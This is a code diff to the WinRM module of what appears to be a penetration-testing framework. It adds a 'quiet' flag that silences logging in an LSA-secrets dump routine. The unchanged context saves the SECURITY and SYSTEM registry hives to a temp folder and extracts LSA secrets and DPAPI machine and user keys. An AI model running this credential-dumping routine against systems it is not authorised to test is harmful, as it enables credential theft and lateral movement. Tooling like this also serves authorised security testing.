@@ -374,7 +374,7 @@ class winrm(connection):
             SAM.dump()
             SAM.export(output_filename)
 
-    def lsa(self):
+    def lsa(self, quiet=False):
         security_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
@@ -393,18 +393,21 @@ class winrm(connection):
             else:
                 self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
         else:
-            self.logger.display("Dumping LSA secrets")
+            if not quiet:
+                self.logger.display("Dumping LSA secrets")
             local_operations = LocalOperations(f"{output_filename}.system")
             boot_key = local_operations.getBootKey()
 
             def lsa_secret_callback(_, secret):
                 if "dpapi_machinekey" not in secret:
-                    self.logger.highlight(secret)
+                    if not quiet:
+                        self.logger.highlight(secret)
                 else:
                     correl_table = {"dpapi_machinekey": "MachineKey", "dpapi_userkey": "UserKey"}
                     self.dpapi_system_key = {correl_table[k]: binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())}
-                    self.logger.highlight(f"dpapi_machinekey:{self.dpapi_system_key['MachineKey'].hex()}")
-                    self.logger.highlight(f"dpapi_userkey:{self.dpapi_system_key['UserKey'].hex()}")
+                    if not quiet:
+                        self.logger.highlight(f"dpapi_machinekey:{self.dpapi_system_key['MachineKey'].hex()}")
+                        self.logger.highlight(f"dpapi_userkey:{self.dpapi_system_key['UserKey'].hex()}")
             LSA = LSASecrets(
                 f"{output_filename}.security",
                 boot_key,
